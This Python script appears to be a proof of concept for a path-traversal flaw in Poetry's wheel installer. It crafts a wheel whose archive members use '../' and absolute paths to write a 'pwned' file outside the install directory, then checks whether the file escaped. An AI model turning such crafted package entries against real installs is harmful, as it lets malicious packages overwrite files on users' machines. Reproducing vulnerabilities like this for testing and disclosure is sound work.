import tempfile
import zipfile

from pathlib import Path

from poetry.installation.wheel_installer import WheelInstaller
from poetry.utils.env import MockEnv

for member in ["../../../escaped.txt", str(Path("abs_escape.txt").resolve())]:
    tmp = Path(tempfile.mkdtemp()).resolve()
    whl = tmp / "demo-0.1.0-py3-none-any.whl"
    with zipfile.ZipFile(whl, "w") as zf:
        zf.writestr("demo-0.1.0.dist-info/METADATA", "Metadata-Version: 2.1\nName: demo\nVersion: 0.1.0\n")
        zf.writestr("demo-0.1.0.dist-info/WHEEL", "Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
        zf.writestr(member, "pwned\n")
        zf.writestr("demo-0.1.0.dist-info/RECORD", "")
    env = MockEnv(path=tmp / "project" / "venv")
    installer = WheelInstaller(env)
    installer.install(whl)
    target = Path(env.scheme_dict["purelib"]) / member
    print(member, "->", target.resolve(), target.exists())
